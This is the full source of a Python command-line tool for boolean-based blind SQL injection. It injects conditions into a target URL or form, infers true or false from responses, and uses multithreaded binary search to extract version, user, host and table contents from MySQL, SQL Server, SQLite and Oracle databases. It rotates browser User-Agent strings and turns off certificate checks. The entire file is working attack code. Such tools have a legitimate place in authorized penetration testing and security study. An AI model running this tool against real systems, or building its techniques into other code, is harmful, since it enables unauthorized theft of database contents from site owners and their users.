#!/usr/bin/env python3
# Boolean-based Blind SQLi tool by TrebledJ.
# Help: python bsqli.py -h
# Docs: https://github.com/TrebledJ/bsqli.py

import sys
from urllib.parse import quote_plus, quote
import time
from typing import *
import logging
import math
import argparse
import concurrent.futures
from enum import Enum
from dataclasses import dataclass, field
import copy
import random
import threading
from threading import Event
import signal

try:
    import urllib3
    import httpx
    from rich.progress import *
    from rich.logging import RichHandler
    from prompt_toolkit import prompt, PromptSession
    from prompt_toolkit.history import FileHistory
except ImportError as e:
    print(e)
    print('Make sure you have the necessary packages:')
    print()
    print('\tpip install urllib3 httpx rich prompt_toolkit')
    sys.exit(1)


VERSION = '0.6.0'

logging.basicConfig(format="%(message)s", handlers=[RichHandler(log_time_format="[%X]")])
logger = logging.getLogger("bsqli")

urllib3.disable_warnings()
console = Console()

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edge/124.0.0.',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36 Avast/109.0.24252.12',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
]

DEFAULT_HEADERS = {
    'User-Agent': random.choice(USER_AGENTS),
    # 'Cache-Control': 'no-cache',
}

class prompts:
    main = PromptSession(history=FileHistory(".main.prompt.history"))
    table = PromptSession(history=FileHistory(".table.prompt.history"))
    column = PromptSession(history=FileHistory(".column.prompt.history"))
    cfg = PromptSession()


class Palette:
    primary: str = 'blue'
    highlight: str = 'cyan'


@dataclass
class SQLPayload:
    vector: str # Unfinished full SQL payload possibly containing parameters.

    def construct(self, **params) -> str:
        """Returns the complete SQL payload."""
        s = self.vector
        for k in params:
            s = s.replace('{' + k + '}', params[k])
        return s


class ResultError(RuntimeError): pass


T = TypeVar('T')

class ResultParser(Generic[T]):
    @abstractmethod
    def parse(self, resp) -> T | ResultError:
        ...


@dataclass(kw_only=True)
class BooleanResultParser(ResultParser[bool]):
    true_if_status: Optional[int] = None
    true_if_not_status: Optional[int] = None
    true_if_text_contains: Optional[str] = None
    true_if_text_not_contains: Optional[str] = None

    error_if_status: List[int] = field(default_factory=list)
    error_if_text_contains: List[str] = field(default_factory=list)
    error_if_text_not_contains: List[str] = field(default_factory=list)

    def parse(self, resp) -> bool | ResultError:
        if resp.status_code in self.error_if_status:
            return ResultError(f'status code: {resp.status_code}')
        for t in self.error_if_text_contains:
            if t in resp.text:
                return ResultError(f'text contains: {t}')
        for t in self.error_if_text_not_contains:
            if t not in resp.text:
                return ResultError(f'text missing: {t}')
        
        if self.true_if_status is not None:
            return resp.status_code == self.true_if_status
        if self.true_if_not_status is not None:
            return resp.status_code != self.true_if_not_status
        if self.true_if_text_contains is not None:
            return self.true_if_text_contains in resp.text
        if self.true_if_text_not_contains is not None:
            return self.true_if_text_not_contains not in resp.text
        return resp.status_code != '404'


def make_session(max_retries: int, proxy: Optional[str]) -> httpx.Client:
    s = httpx.Client(
        verify=False,
        transport=httpx.HTTPTransport(
            retries=max_retries,
            limits=httpx.Limits(max_connections=100, max_keepalive_connections=100),
        ),
        proxy=proxy
    )
    return s


class ThreadInterruptException(Exception): pass


PAYLOAD_TOKEN = '{payload}'
COND_TOKEN = '{cond}'

@dataclass(kw_only=True)
class Sender:
    url: str
    method: Literal["GET"] | Literal["POST"]
    payload: SQLPayload
    data: Optional[str] = None

    # Request settings.
    headers: Dict
    timeout: float = 5
    allow_redirects: bool = False
    # keep_alive: bool = False
    
    session: httpx.Client
    
    retries_on_error: int = 0   # Number of retries if a response was marked as an error.

    result_parser: ResultParser[bool]

    def send(self, delay: float, delayf: Callable[[float], None], cond: str) -> int | ResultError:
        # sender.send(cond='1=1')
        url, data = self.make_payload(cond=cond)

        for attempt in range(self.retries_on_error + 1):
            delayf(delay)
            if attempt == 0:
                logger.debug(f'Requesting...')
                # logger.debug(f' | payload   : {quoted_payload}')
                logger.debug(f' | url  : {self.url}')
                logger.debug(f' | data : {self.data}')
                if logger.getEffectiveLevel() < logging.INFO:
                    logger.debug(f' | cond : {cond}')
                else:
                    logger.info(f"cond: {cond}")

            logger.debug(f'Attempt #{attempt+1} / {self.retries_on_error+1}')

            try:
                resp = self.make_request(url, data)
            except httpx.TimeoutException as e:
                raise e
            
            result = self.result_parser.parse(resp)
            if isinstance(result, ResultError):
                logger.info(f'Got error: {result}')
                if attempt == self.retries_on_error:
                    # This is the LAST. STRAW.
                    raise result
                logger.info(f'Retrying... ({attempt+1} / {self.retries_on_error})')
            else:
                return result
        
        raise ResultError("(unreachable)")

    def make_payload(self, cond: str):
        url, data = self.url, self.data
        
        if PAYLOAD_TOKEN in url:
            raw_payload = self.payload.construct(cond=cond)
            quoted_payload = quote_plus(raw_payload)
            url = url.replace(PAYLOAD_TOKEN, quoted_payload)
        elif data and PAYLOAD_TOKEN in data:
            raw_payload = self.payload.construct(cond=cond)
            if data.strip().startswith('{'):
                # Probably JSON? No need to quote.
                quoted_payload = raw_payload
            else:
                quoted_payload = quote(raw_payload)
            data = data.replace(PAYLOAD_TOKEN, quoted_payload)
        elif COND_TOKEN in url:
            # PAYLOAD_TOKEN is not found. Substitute COND_TOKEN directly.
            url = url.replace(COND_TOKEN, cond)
        elif data and COND_TOKEN in data:
            # PAYLOAD_TOKEN is not found. Substitute COND_TOKEN directly.
            data = data.replace(COND_TOKEN, cond)
        else:
            raise RuntimeError('payload token not found')
        
        return url, data
    
    def make_request(self, url, data):
        return self.session.request(self.method, url, data=data,
                                timeout=self.timeout,
                                headers=self.headers,
                                follow_redirects=self.allow_redirects)
        

class DBMS(str, Enum):
    MySQL = "MySQL"
    SQLServer = "SQLServer"
    SQLite = "SQLite"
    OracleSQL = "OracleSQL"
    def __str__(self):
        return self.value


class SQLVariant:
    version = '@@version'
    ascii = 'ASCII'
    substring = 'SUBSTRING' # Basic function SUBSTRING(str, pos, len).
    length = 'LENGTH'

class SQLiteVariant(SQLVariant):
    version = 'sqlite_version()'
    current_user = "'no user'"
    ascii = 'UNICODE'
    

class MySQLVariant(SQLVariant):
    current_user = 'current_user()'
    database_name = 'database()'
    server_name = '@@hostname'
    host_name = '@@hostname'

class SQLServerVariant(SQLVariant):
    current_user = 'current_user'
    database_name = 'db_name()'
    server_name = '@@servername'
    host_name = 'host_name()'
    length = 'LEN'
    
class OracleSQLVariant(SQLVariant):
    version = '(select banner from v$version where rownum = 1)'
    current_user = 'current_user'
    database_name = None
    server_name = None
    host_name = None
    substring = 'SUBSTR'


variant_class = {
    DBMS.MySQL: MySQLVariant,
    DBMS.SQLServer: SQLServerVariant,
    DBMS.SQLite: SQLiteVariant,
    DBMS.OracleSQL: OracleSQLVariant,
}


class BSearchError(Enum):
    AboveMax = 1
    BelowMin = 2
    ErrorMidway = 3


def mk_thread_delay(int_evt: Event, resume_evt: Event, quit_evt: Event, main_thread_int_cb: Callable[[], bool] = lambda: True):
    """
    Constructs a delay function which waits for an interrupting Thread.Event, rather than using time.sleep.
    Main thread callback should return True if execution continues, or False if interrupted.
    """
    def handle_int_signal(signo, _frame):
        resume_evt.clear()
        int_evt.set()

    signal.signal(signal.SIGTERM, handle_int_signal) # Unix-like
    signal.signal(signal.SIGINT, handle_int_signal)  # Windows
    # signal.signal(signal.SIGABRT, lambda signo, _frame: print('SIGABRT called')) 
    # try: signal.signal(signal.SIGQUIT, lambda signo, _frame: print('SIGQUIT called')) 
    # except AttributeError: pass
    # try: signal.signal(signal.SIGKILL, lambda signo, _frame: print('SIGKILL called')) 
    # except AttributeError: pass
    # try: signal.signal(signal.SIGBREAK, lambda signo, _frame: print('SIGBREAK called')) 
    # except AttributeError: pass
    
    def delay(sec):
        if threading.current_thread() is threading.main_thread():
            start = time.time()
            while not int_evt.wait(0.1) and (time.time() - start) < sec:
                pass

            if int_evt.is_set():
                logger.debug('[main] Interrupt detected.')
                if not main_thread_int_cb():
                    raise ThreadInterruptException
        else:
            # Not main thread.
            if quit_evt.is_set():
                # Smokers should be like these threads... just quit early.
                raise ThreadInterruptException
            
            if int_evt.wait(sec):
                # Interrupt detected. Wait for synchronous resume.
                logger.debug('[thread] Interrupt detected, waiting for resume.')

                resume_evt.wait()
                if quit_evt.is_set():
                    # Move to the top level by throwing an exception.
                    raise ThreadInterruptException
                else:
                    # Resume running.
                    pass
    
    return delay
            

@dataclass
class SQLStringBrute:
    sender: Sender
    prog: Progress
    dbms: DBMS
    max_threads: int
    delay: float

    int_evt: Event = Event()
    resume_evt: Event = Event()
    quit_evt: Event = Event()
    delayf: Callable[[float], None] = time.sleep

    def mk_delayf(self):
        self.delayf = mk_thread_delay(self.int_evt, self.resume_evt, self.quit_evt, self.on_main_thread_int)
    
    def send_with_default(self, cond):
        return self.sender.send(cond=cond, delay=self.delay, delayf=self.delayf)

    def reset_evts(self):
        self.int_evt.clear()
        self.resume_evt.clear()
        self.quit_evt.clear()

    def on_main_thread_int(self) -> bool:
        is_interactive = [False] # Use a list[bool] instead of simple bool to hack around Python's variable lookup.

        def disable_prog(prog):
            prog.update(prog.task_ids[0], visible=False, refresh=True)
            prog.disable = True
            prog.live.auto_refresh = False
            is_interactive[0] = prog.live.console.is_interactive
            prog.live.console.is_interactive = False
        
        def enable_prog(prog):
            prog.live.console.is_interactive = is_interactive[0]
            prog.live.auto_refresh = True
            prog.disable = False
            prog.update(prog.task_ids[0], visible=True, refresh=True)

        self.int_evt.clear()
        disable_prog(self.prog)
        cont = config_loop(self.sender, self, paused_from_task=True)
        if cont:
            self.quit_evt.clear()
        else:
            self.quit_evt.set()
        self.resume_evt.set()
        enable_prog(self.prog)
        return bool(cont)

    def get_by_bsearch(self, sql: str, min: int, max: int, *, index: Optional[int]=None, task=None, delay: Optional[float] = None) -> int | BSearchError:
        """
        Search for the value of a query within a numeric range: [min, max).
        The query should return one integer.
        For strings, use ASCII(SUBSTRING(s, offset, 1)).
        """
        # prev = None  # Previous guess.
        if delay == None:
            delay = self.delay

        if not self.sender.send(cond=f'{sql}<{max}', delay=delay, delayf=self.delayf):
            # Not even within range?
            return BSearchError.AboveMax
        
        if self.sender.send(cond=f'{sql}<{min}', delay=delay, delayf=self.delayf):
            return BSearchError.BelowMin

        while min < max:
            mid = (min + max) // 2
            
            if mid == min:
                return mid

            if task is not None:
                self.prog.update(task, value=mid, advance=1)
            
            if index is None:
                logger.debug(f'length: {mid}')
            else:
                logger.debug(f'{index}: {mid}')

            if self.sender.send(cond=f'{sql}<{mid}', delay=delay, delayf=self.delayf):
                # Len is upper bound.
                max = mid
            else:
                min = mid
            # prev = mid
            
        return BSearchError.ErrorMidway
    

    def get_length(self, sql, min_len=0, max_len=2048, **kwargs):
        sql = f'{getattr(variant_class[self.dbms], "length")}(({sql}))'
        return self.get_by_bsearch(sql, min_len, max_len, **kwargs)

    @staticmethod
    def format_bytes(xs: bytes) -> bytes:
        return b"".join(xs)

    @staticmethod
    def preview_bytes(xs: bytes) -> bytes | str:
        bs = b"".join(xs)[:40]
        try:
            return bs.decode()
        except:
            return bs
        

    def get_string(self, sql):
        # TODO: refactor individual tasks into BinarySearch tasks, track progress one level deeper
        # into the binary search level by estimating the number of requests required and advancing
        # as appropriate. Put get_length into a BinarySearch task as well, then we can interrupt its
        # sleep as if from a worker thread rather than main thread.
        self.reset_evts()

        # Since obtaining length is a single-threaded task, we can compensate for long delays by emulating multiple threads.
        # In the end, the request rate is the same.
        single_threaded_delay = self.delay / self.max_threads
        with self.prog:
            max_len = 2048
            task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
            try:
                length = self.get_length(sql, max_len=max_len, task=task, delay=single_threaded_delay)
            except (ThreadInterruptException, KeyboardInterrupt) as e:
                self.prog.remove_task(task)
                raise e # Re-raise to exit to main loop.
            
            self.prog.remove_task(task)

        if isinstance(length, BSearchError):
            if length != BSearchError.AboveMax:
                logger.warning(f"unable to get length ({length})")
                return ''
            
            logger.warning("unable to get length: retrying with higher upper bound")

            with self.prog:
                min_len = max_len
                max_len = 64000
                task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
                try:
                    length = self.get_length(sql, min_len=min_len, max_len=max_len, task=task, delay=single_threaded_delay)
                except (ThreadInterruptException, KeyboardInterrupt) as e:
                    self.prog.remove_task(task)
                    raise e # Re-raise to exit to main loop.
                
                self.prog.remove_task(task)
            
            if isinstance(length, BSearchError):
                # Still???
                logger.warning(f"unable to get length after compensating ({length})")
                return ''

        logger.info(f"Length: {length}")
        if length > 5000:
            logger.warning(f"The deduced length is {length}... that's a lot of chars to get in one go.")
            logger.warning(f"You may want to hit ^C early to think twice and refine the query.")

        result_chars = [b'?'] * length


        variant = variant_class[self.dbms]
        ASCII = getattr(variant, 'ascii')
        SUBSTRING = getattr(variant, 'substring')

        with self.prog:
            init_value = SQLStringBrute.preview_bytes(result_chars)
            task = self.prog.add_task("[green]inspecting...", value=init_value, total=length)

            def on_index_finished(idx):
                def callback(future):
                    try:
                        ch = future.result()
                        if not isinstance(ch, BSearchError):
                            # Update char to list.
                            result_chars[idx] = bytes([ch])
                    except ThreadInterruptException:
                        logger.debug(f'ThreadInterruptExecution for Char #{idx}')
                    except Exception as exc:
                        logger.warning(f'Char #{idx} generated an exception: {type(exc)} {exc}')
                    else:
                        # self.prog.update doesn't check if the task is in available tasks.
                        # This may be an issue if we interrupted multithreading and some were just finishing.
                        if task in self.prog.task_ids:
                            self.prog.update(task, value=SQLStringBrute.preview_bytes(result_chars), advance=1, refresh=True)
                        if logger.getEffectiveLevel() <= logging.INFO:
                            if isinstance(ch, ResultError):
                                self.prog.console.log(f"str[{idx}] = error ({ch})")
                            else:
                                self.prog.console.log(f"str[{idx}] = {result_chars[idx]} ({ch})")
                
                return callback

            try:
                # Start threads.
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                    future_map = {}

                    # Create threads and on-complete handlers.
                    for idx in range(length):
                        f = executor.submit(
                                self.get_by_bsearch,
                                sql=f"{ASCII}({SUBSTRING}(({sql}),{idx+1},1))",
                                min=0,
                                max=128,
                                index=idx,
                                delay=self.delay,
                            )
                        f.add_done_callback(on_index_finished(idx))
                        future_map[f] = idx
                    
                    while True:
                        sets = concurrent.futures.wait(future_map, timeout=0.1)
                        if len(sets.not_done) == 0:
                            # All done!
                            logger.info('[main] All tasks done!')
                            break

                        if self.int_evt.is_set():
                            logger.debug('[main] Interrupt detected.')
                            res = self.on_main_thread_int()
                            if not res:
                                # Quit.
                                logger.info(f'[main] Quitting early. {len(sets.not_done)} tasks skipped...')
                                break
                        
            except (KeyboardInterrupt, EOFError, ThreadInterruptException) as e:
                print(f'Received {e.__class__.__name__} while multi-threading.')
                print('Cleaning up...')
            
            self.prog.remove_task(task)
        
        return SQLStringBrute.format_bytes(result_chars)

    def get_number(self, sql):
        with self.prog:
            max_n = 32768
            task = self.prog.add_task("[green]measuring...", value=str(max_n), total=int(math.log(max_n, 2)+1))
            try:
                num = self.get_by_bsearch(sql, min=0, max=max_n, task=task)
            except KeyboardInterrupt as e:
                self.prog.remove_task(task)
                raise e # Re-raise to exit to main loop.
               
            self.prog.remove_task(task)

        if isinstance(num, BSearchError):
            logger.warning(f"bsearch error occurred while getting number: {num}")
            return ''
        
        return str(num)


@dataclass
class SQLOptions:
    cast_to_string: bool
    cast_to_string_length: int


@dataclass
class Query:
    brute: SQLStringBrute
    variant: SQLVariant
    options: SQLOptions

    def query(self, sql, info='information'):
        console.print(f"(+) retrieving {info}...")
        start = time.time()

        numeric_funcs = ['count', getattr(self.variant, "length").lower()]

        for func in numeric_funcs:
            if func in sql[:40].lower():
                logger.warning(f'Detected [bold green]{func}[/] query. Switching to (faster) numeric brute.', extra={"markup": True})
                res = self.brute.get_number(f'({sql})')
                break
        else:
            if self.options.cast_to_string:
                cast_len = self.options.cast_to_string_length
                match self.brute.dbms:
                    case DBMS.MySQL | DBMS.SQLite:
                        res = self.brute.get_string(f'cast(({sql}) as char({cast_len}))')
                    case DBMS.SQLServer:
                        res = self.brute.get_string(f'cast(({sql}) as varchar({cast_len}))')
                    case DBMS.OracleSQL:
                        res = self.brute.get_string(f'cast(({sql}) as varchar({cast_len}))')
                    case _:
                        logger.warning('Warning: cast-to-string has not been implemented for the specified DBMS. Defaulting to normal brute.')
                        res = self.brute.get_string(f'{sql}')
            else:
                res = self.brute.get_string(f'{sql}')

        end = time.time()

        try:
            res = res.decode()
        except:
            pass

        if res.strip():
            console.print(res, style=Palette.primary)
        else:
            console.print('empty result', style='yellow')
        
        console.print(f'Queries finished in {end - start:.1f}s', style=Palette.highlight)

    def special(self, shorthand):
        if hasattr(self.variant, shorthand):
            sql = getattr(self.variant, shorthand)
            self.query(sql, info=shorthand.replace('_', ' '))
        else:
            raise NotImplementedError(f"unknown shorthand '{shorthand}' for dbms {self.brute.dbms}")
        
    def check(self):
        ok = True
        m, n = random.randint(10, 10000), random.randint(10, 10000)
        try:
            res = self.brute.send_with_default(cond=f'{n}={n}')
        except ResultError as e:
            logging.error(f"Got an error while making the test request: {e}")
            ok = False
        else:
            logging.info(f"--> {res}")
            if not res:
                logging.error("Unable to verify TRUE request.")
                logging.error(f"Sent condition {n}={n}, expected TRUE, but got FALSE.")
                ok = False
        
        if m == n:
            m -= 1
        try:
            res = self.brute.send_with_default(cond=f'{m}={n}')
        except ResultError as e:
            logging.error(f"Got an error while making the test request: {e}")
            ok = False
        else:
            logging.info(f"--> {res}")
            if res:
                logging.error("Unable to verify FALSE request.")
                logging.error(f"Sent condition {m}={n}, expected FALSE, but got TRUE.")
                ok = False
        
        if ok:
            console.log("Checks passed.")


    def query_table(self, table, col):
        # is_notbased = (id_col.strip() == '')

        match self.brute.dbms:
            case DBMS.MySQL | DBMS.SQLite:
                sql = 'select {col} from {table}{where_clause} limit 1'
            case DBMS.SQLServer:
                sql = 'select top 1 {col} from {table}{where_clause}'
            case DBMS.OracleSQL:
                sql = 'select {col} from {table} where rownum=1'
            case _:
                raise NotImplementedError()

        i = 0
        entries = []
        while True:
            console.print(f'(+) retrieving entry #{i+1}')
            params = dict(table=table, col=col, where_clause='')
            # if is_notbased:
            if entries:
                array = ",".join(f"'{x}'" for x in entries)
                params.update(where_clause=f' where {col} not in ({array})')

            name = self.brute.get_string(sql.format_map(params))
            # else:
            #     name = self.brute.get_string(f'select {col} from {table} where {id_col}={i+1}', max_threads)
            if not name.strip():
                break

            try:
                name = name.decode()
            except:
                pass

            console.print(f'entry [bold]#{i+1}[/bold]: {name}', style=Palette.primary)
            entries.append(name)
            i += 1

        ans = prompt(f'Print all ({len(entries)}) entries? [Y/n]')
        if not ans.strip() or ans.lower().startswith('y'):
            console.print(table)
            console.print('-'*20)
            console.print('\n'.join(entries))
        else:
            console.print('\n'.join(entries[:5]))


def make_headers(args):
    headers = copy.copy(DEFAULT_HEADERS)
    
    # Add headers from args.
    for h in args.header:
        k, v = h.split(':', 1)
        headers[k.strip()] = v.strip()

    if args.data and 'Content-Type' not in headers:
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    # if args.keep_alive:
    #     headers['Connection'] = 'keep-alive'
    # else:
    #     headers['Connection'] = 'close'
    
    return headers


class Formatter(argparse.RawDescriptionHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
    pass


def main():
    global PAYLOAD_TOKEN, COND_TOKEN

    parser = argparse.ArgumentParser(description=f'Boolean-based Blind SQLi tool by TrebledJ.', formatter_class=Formatter)
    
    parser.add_argument('-V', '--version', action='store_true', help='Print script version')

    parser.add_argument('-u', '--url', 
                        help='The url to scan, with the scheme (e.g. http://192.168.1.1/admin). Possibly containing an injection point marked with `{payload}`.')
    parser.add_argument('--data', default='',
                        help='Url-encoded data to send with the request. Possibly containing an injection point marked with `{payload}`.')
    
    parser.add_argument('-X', '--method', choices=["GET", "POST"], default='GET', help='GET or POST')
    parser.add_argument('-H', '--header', action='append', default=[], help='Extra headers to send with requests.')
    parser.add_argument('--timeout', default=5, type=float, help='Timeout of each request.')
    parser.add_argument('--payload', help='The SQLi payload.')

    parser.add_argument('--proxy', default=None, help='Send requests to a proxy. Example: http://127.0.0.1:8080.')
    parser.add_argument('--follow-redirects', action='store_true', help='Follows redirects in responses.')
    # parser.add_argument('--keep-alive', action='store_true', help='Enables `Connection: keep-alive`.')
    parser.add_argument('--max-retries', default=3, type=int, help='Maximum number of HTTP connection retries to attempt.')

    parser.add_argument('--dbms', choices=[DBMS.MySQL, DBMS.SQLServer, DBMS.SQLite, DBMS.OracleSQL], help='The database management system.')
    parser.add_argument('--strategy', choices=["B"], default='B',
                        help='The strategy to use: Boolean. You don\'t have any other choice at this moment.')
    parser.add_argument('-t', '--threads', default=8, type=int, help='Number of threads to use.')
    parser.add_argument('-d', '--delay', default=0, type=float, help='Number of seconds to delay each thread between requests.')
    parser.add_argument('-v', action='count', default=0, help='Verbosity. -v for INFO, -vv for DEBUG messages.')

    parser.add_argument('-bts', '--boolean-true-if-status', type=int,
                        help='If the response returns the provided status, mark the response as TRUE. All other statuses are FALSE.')
    parser.add_argument('-bfs', '--boolean-false-if-status', type=int,
                        help='If the response returns the provided status, mark the response as FALSE. All other statuses are TRUE.')
    parser.add_argument('-bttc', '--boolean-true-if-text-contains',
                        help='If the response text contains the provided text, mark the response as TRUE. Otherwise, FALSE.')
    parser.add_argument('-bftc', '--boolean-false-if-text-contains',
                        help='If the response text contains the provided text, mark the response as FALSE. Otherwise, TRUE.')

    parser.add_argument('-bes', '--boolean-error-if-status', action='append', default=[],
                        help='If the provided statuses are encountered, mark the query as an error. Accepts multiple arguments (e.g. -bes 400, -bes 401).')
    parser.add_argument('-betc', '--boolean-error-if-text-contains', action='append', default=[],
                        help='If the provided text is encountered in the response body, mark the query as an error. Accepts multiple arguments.')
    parser.add_argument('-betn', '--boolean-error-if-text-not-contains', action='append', default=[],
                        help='If the provided text was NOT encountered in the response body, mark the query as an error. Accepts multiple arguments.')
    parser.add_argument('--max-retries-on-error', type=int, default=3,
                        help='Maximum number of retries if a response is marked as an error.')
    
    parser.add_argument('--cast-to-string', action='store_true',
                        help='Cast the target output to varchar(2048) string. This allows numbers and other data types to be treated as strings, so that our standard ASCII-SUBSTRING algorithm can work.')
    parser.add_argument('--cast-to-string-length', default=2048, type=int,
                        help='The length of the string to cast to. If you specify this, you should also enable --cast-to-string.')
    
    # TODO: unicode support
    # TODO: improve table enumeration
    
    # Primary console colour.
    parser.add_argument('--color-primary', default=Palette.primary, help=argparse.SUPPRESS)
    # Highlight console colour.
    parser.add_argument('--color-highlight', default=Palette.highlight, help=argparse.SUPPRESS)
    
    args = parser.parse_args()

    if args.version:
        print(VERSION)
        return

    if args.url is None:
        parser.print_help()
        return 1
    
    match args.v:
        case 0:
            logger.setLevel(logging.WARNING)
        case 1:
            logger.setLevel(logging.INFO)
        case _:
            logger.setLevel(logging.DEBUG)
            
    # PAYLOAD_TOKEN = args.payload_token
    # COND_TOKEN = args.cond_token
    Palette.primary = args.color_primary
    Palette.highlight = args.color_highlight
    
    assert args.url.startswith('http://') or args.url.startswith('https://'), 'Expected URL to start with http:// or https://.'
    assert args.max_retries_on_error >= 0, 'Retries on error should be non-negative.'
    assert args.dbms is not None, 'Expected DBMS parameter. Please specify the DBMS with --dbms.'

    console.print()
    console.print('-- @TrebledJ/bsqli.py --', style=Palette.primary)
    console.print(f'{"v" + VERSION:->22}--', style=Palette.primary, highlight=False)

    match args.strategy:
        case "B":
            parser = BooleanResultParser(
                true_if_status=args.boolean_true_if_status,  
                true_if_not_status=args.boolean_false_if_status,  
                true_if_text_contains=args.boolean_true_if_text_contains,  
                true_if_text_not_contains=args.boolean_false_if_text_contains,
                error_if_status=[int(c) for c in args.boolean_error_if_status],
                error_if_text_contains=args.boolean_error_if_text_contains,
                error_if_text_not_contains=args.boolean_error_if_text_not_contains,
            )
        case _:
            raise NotImplementedError()
        
    sender = Sender(
        url=args.url,
        method=args.method,
        payload=SQLPayload(args.payload),
        headers=make_headers(args),
        data=args.data,
        timeout=args.timeout,
        allow_redirects=args.follow_redirects,
        session=make_session(args.max_retries, args.proxy),
        retries_on_error=args.max_retries_on_error,
        result_parser=parser,
    )

    brute = SQLStringBrute(
        sender=sender,
        prog=Progress(
            TextColumn(f"[bold {Palette.primary}]{{task.fields[value]}}"),
            *Progress.get_default_columns(),
            transient=True,
        ),
        dbms=args.dbms,
        max_threads=args.threads,
        delay=args.delay,
    )
    brute.mk_delayf()
    
    sql_options = SQLOptions(
        cast_to_string=args.cast_to_string,
        cast_to_string_length=args.cast_to_string_length,
    )
    
    query = Query(brute, variant=variant_class[args.dbms], options=sql_options)

    while 1:
        try:
            sql = prompts.main.prompt("sqli> ")
        except KeyboardInterrupt:
            continue
        except EOFError:
            console.print('Exiting...')
            break
        
        try:
            match sql.split():
                case ["q"] | ["quit"]:
                    break
                case ["help"]:
                    console.print("Commands:")
                    console.print(" [bold green]help          [/]- this menu")
                    console.print(" [bold green]q/quit/Ctrl+D [/]- exit program")
                    console.print(" [bold green]c/config      [/]- configure settings dynamically")
                    console.print("")
                    console.print("To pause the program during a run, hit [green]Ctrl+C[/]. This enters config mode.")
                    console.print("Then enter 'c'/'continue' to resume execution, or 'q'/'quit' to cancel.")
                    console.print("")
                    console.print("Common SQL Commands:")
                    console.print(" [bold green]v [/]- version")
                    console.print(" [bold green]u [/]- current user")
                    console.print(" [bold green]d [/]- database name")
                    console.print(" [bold green]h [/]- host name")
                    console.print(" [bold green]s [/]- server name")
                    console.print(" [bold green]t [/]- enumerate a table and column one row at a time (slow)")
                    console.print("")
                    console.print("You can also run any subquery-able SQL command by inputting raw SQL directly, e.g.")
                    console.print("sqli> SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES", highlight=False)
                    console.print("")
                    console.print("Note that the query should return 1 row and 1 column.")
                    console.print("SQL concat/aggregation functions will help you out here.")
                    console.print("e.g. JSON_ARRAYAGG / GROUP_CONCAT in MySQL")
                    console.print("     LISTAGG                      in OracleSQL")
                    console.print("     CONCAT / CONCAT_WS           for multiple columns")
                    console.print("")
                case ["v"]:
                    query.special('version')
                case ["u"]:
                    query.special('current_user')
                case ["d"]:
                    query.special('database_name')
                case ["h"]:
                    query.special('host_name')
                case ["s"]:
                    query.special('server_name')
                case ["t"]:
                    table = prompts.table.prompt('table> ')
                    col = prompts.column.prompt('col> ')
                    query.query_table(table, col)
                case ["check"]:
                    query.check()
                case ["c"] | ["conf"] | ["config"]:
                    config_loop(sender, brute)
                case []:
                    continue
                case ["set", *_]:
                    console.print("Use 'config' to enter config mode first.")
                case _:
                    query.query(sql)
        except httpx.TimeoutException as e:
            console.print(f"Looks like the request timed out: {e}.")
        except NotImplementedError as e:
            console.print(f"Received NotImplementedError during task: {e}.")
        except (KeyboardInterrupt, EOFError, ThreadInterruptException) as e:
            console.print(f"Received {e.__class__.__name__} during task.")


def config_loop(sender: Sender, brute: SQLStringBrute, paused_from_task=False) -> bool | None:
    def help():
        console.print('Usage:')
        console.print('  [green]set[/] \\[thread|delay|timeout|loglevel] <value>')
        if paused_from_task:
            console.print('  [green]continue / c[/]')
        console.print('  [green]quit / q[/]')
    
    def confirm(op):
        ans = prompt(f"Are you sure you want to {op}? [y/N] ")
        return ans.lower().startswith('y')

    while 1:
        try:
            line = prompts.cfg.prompt("cfg> ")
            match line.split():
                case ['set', 'thread', value]:
                    if paused_from_task:
                        console.print("The new number of threads will be reflected once a new task has started.")
                        console.print("If you want this to take effect now, stop the current task and run the SQLi command again.")

                    brute.max_threads = max(int(value), 1)
                case ['set', 'delay', value]:
                    brute.delay = max(float(value), 0.0)
                case ['set', 'timeout', value]:
                    sender.timeout = float(value)
                case ['set', 'loglevel', value]:
                    if value.upper() not in logging._nameToLevel:
                        console.print('Unknown log level.')
                        continue

                    logger.setLevel(logging._nameToLevel[value.upper()])
                case ['q', *_] | ['quit', *_]:
                    if paused_from_task:
                        if confirm("cancel this operation"):
                            return False
                        continue
                    return
                case '' | ['c', *_] | ['continue', *_]:
                    if paused_from_task:
                        return True
                    help()
                case _:
                    help()
        except ValueError as e:
            logger.error(f'ValueError: {e}')
            help()
        except (KeyboardInterrupt, EOFError):
            if paused_from_task:
                try:
                    if confirm("cancel this operation"):
                        return False
                except (KeyboardInterrupt, EOFError) as e:
                    logger.debug(f"Got {type(e)}: {e}. I'll take that as a yes.")
                    return False
            else:
                return
            

try:
    rc = main()
except AssertionError as e:
    print()
    print(e)
    sys.exit(1)
    
sys.exit(rc if rc else 0)
